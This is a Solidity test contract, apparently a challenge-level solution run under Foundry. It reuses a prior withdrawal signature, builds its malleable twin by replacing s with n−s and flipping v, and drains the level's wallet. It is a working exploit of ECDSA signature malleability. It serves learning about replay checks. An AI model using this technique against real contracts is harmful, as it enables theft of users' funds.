// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title test level contract
/// @notice contains functions for testing level completion and signature deconstruction
contract TestLevelContract {
    // asssumed external variables from ovm testing framework
    address[] public users;
    SomeLevelContract public level; // replace with o contrato correto

    /**
     * @notice tests complete level functionality including the signature malleability exploit
     */
    function testCompleteLevel() public {
        // select the first player from the users array
        address player = users[0];
        // start acting as the player (using forge vm functions)
        vm.startPrank(player);

        // store initial balances for later assertions
        uint256 playerBalanceBefore = player.balance;
        uint256 walletBalanceBefore = address(level).balance;

        // signature extracted from a previous withdraw transaction on etherscan
        bytes memory signature = hex"53e2bbed453425461021f7fa980d928ed1cb0047ad0b0b99551706e426313f293ba5b06947c91fc3738a7e63159b43148ecc8f8070b37869b95e96261fc9657d1c";

        // attempt to withdraw using the same signature should revert with a specific error message
        vm.expectRevert(bytes("Signature already used!"));
        level.withdraw(signature);

        // deconstruct the original signature into its components (v, r, s)
        (uint8 v, bytes32 r, bytes32 s) = deconstructSignature(signature);

        // calculate the inverted signature values to exploit signature malleability
        bytes32 groupOrder = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
        bytes32 invertedS = bytes32(uint256(groupOrder) - uint256(s));
        uint8 invertedV = v == 27 ? 28 : 27;

        // reassemble the inverted signature
        bytes memory invertedSignature = abi.encodePacked(r, invertedS, invertedV);

        // perform the withdraw using the inverted signature
        level.withdraw(invertedSignature);

        // stop acting as the player
        vm.stopPrank();

        // verify that the player's balance increased by the wallet balance and that the wallet is drained
        assertEq(player.balance, playerBalanceBefore + walletBalanceBefore);
        assertEq(address(level).balance, 0 ether);
    }

    /**
     * @notice deconstructs an ecdsa signature into its v, r and s components
     * @param signature the full signature bytes
     * @return v the recovery id
     * @return r the first 32 bytes of the signature
     * @return s the second 32 bytes of the signature
     */
    function deconstructSignature(bytes memory signature)
        public
        pure
        returns (
            uint8 v,
            bytes32 r,
            bytes32 s
        )
    {
        assembly {
            r := mload(add(signature, 0x20))
            s := mload(add(signature, 0x40))
            v := byte(0, mload(add(signature, 0x60)))
        }
    }
}
